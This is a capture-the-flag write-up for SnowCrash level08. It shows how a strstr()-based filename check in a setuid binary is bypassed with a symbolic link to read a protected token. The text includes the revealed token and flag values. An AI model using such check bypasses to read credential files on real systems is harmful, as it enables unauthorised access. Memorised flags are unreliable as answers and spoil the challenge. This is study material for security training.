
in this level we got:
--------------------------------
level08@SnowCrash:~$ ls
level08  token
--------------------------------

let's execute level08:
--------------------------------
level08@SnowCrash:~$ ./level08
./level08 [file to read]
--------------------------------

so it needs a file, let's pass token to it:
--------------------------------
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
--------------------------------

so it doesn't wanna take the file.
let's see how the program behave using ltrace:
--------------------------------
level08@SnowCrash:~$ ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff7b4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                                   = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)               = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
--------------------------------

so the program use strstr() |man strstr to check it|
and then if the file is named token it exit

so we need to pass the file token in a way to the program 
and the only way is using symbolic link

so let's create in tmp a file linked to token:
--------------------------------
level08@SnowCrash:~$ ln -s ~/token /tmp/pass
--------------------------------

now let's just pass the file to the program:
--------------------------------
level08@SnowCrash:~$ ./level08 /tmp/pass
quif5eloekouj29ke0vouxean
--------------------------------

Good! now let's get the flag:
--------------------------------
level08@SnowCrash:~$ su flag08
Password:
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
flag08@SnowCrash:~$ su level09
Password:
level09@SnowCrash:~$
--------------------------------
